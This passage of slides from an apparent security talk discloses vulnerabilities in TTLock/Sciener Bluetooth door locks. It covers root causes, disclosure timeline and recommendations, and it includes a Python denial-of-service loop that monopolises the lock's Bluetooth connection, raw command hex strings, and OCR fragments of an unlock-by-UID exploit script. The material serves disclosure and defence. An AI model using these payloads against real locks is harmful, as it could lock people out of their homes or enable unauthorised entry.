## Slide 71

### **The cheapest DoS DoS due to Bluetooth connection not having a timeout set**

No Bluetooth timeout mechanism is configured. If the script occupies the lock’s Bluetooth connection, the APP will be unable to unlock the door.

async def perform_handshake(self): return await self._send_command("7f5a0501010001000145aa00e20d0a", name="Handshake")

async def run(self): try: if not await self.scan_device(): return await self.connect() await self.read_device_info() while True: await self.perform_handshake() await asyncio.sleep(0.5)

## Slide 72

### **Privilege escalation problems?**

###### Unfortunately no.

> Check Admin 41 All administrator operations require both an administrator password and administrator UID, which mitigates potential attacks.

26D2FC7B00000002ACD30B

## Slide 73

Real World Exploit

## Slide 74

### **A perfectly orchestrated "crime" "Using time magic, open doors like a ghost."**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
A perfectly orchestrated "crime"
"Using time magic, open doors like a ghost."
©
Pam
at —>®
— |
APP
```

## Slide 75

### **Unlock video**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Unlock video
([ ® unlock_test.py ® unlock_by_uid.py X | @ unlock_change_date.py
@ unlock_by_uid.py > le
Q class TTLockClient
f perform_check_user_by_date(sel/)
user_id = 'Q@FB1FB1'
SYNC ¢
or
t
r raw_payload = bytes. fromhex(user_registration_date + user_maturity_date + 00000" + user_id)
oe enc_payload = encrypt_aes(raw_payload) SS nacetat Sua pn ew)
=
a =
=) "7650" :
packet_head = bytes. fromhex('7#5a") =
_ version = bytes. fromhex(' 050302000f0201") -
”) ble_cmd = bytes. fromhex('SS")
sep = bytes. fromhex('aa")
(env) + ttlock python3 unlock_by_uid.pyff
```

## Slide 76

### **Affected area Data from Sciener official website**

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Affected area
Data from Sciener official website
9 million 13k 150k
Total number of rooms managed
Personal version registered users Platform registration apartment
by the apartment
5k 7 million 200
Total lock shipments over five Global coverage of countries and
Number of hotels signed
years (sets) regions
```

## Slide 77

Mitigation & Conclusion

## Slide 78

**The Root Case The root cause of door lock problems** 1. Improper AES key management (hardcoded keys, key leakage) 2. Keyboard password relies heavily on the lock's system time 3. No validation on the legitimacy of ordinary user UID 4. Bluetooth without timeout setting leads to denial of service (DoS)

5. Defects in log recording design

## Slide 79

**Disclosure Timeline** • Report vulnerabilities to the vendor - Mar 6, 2026 • More than 90 days have passed without receiving any reply - Jul 1, 2026

## Slide 80

### **Recommendations**

**_End users Integrators_** Don't trust "autoAudit the protocol, not expiry" the app UI

**_Vendors_** Time needs a trusted source

## Slide 81

# Closing Full Report: <u>https://github.com/unrav31/ttlock_vuln</u> Contact: Zhenghan Wang

@unrav31 unrav31
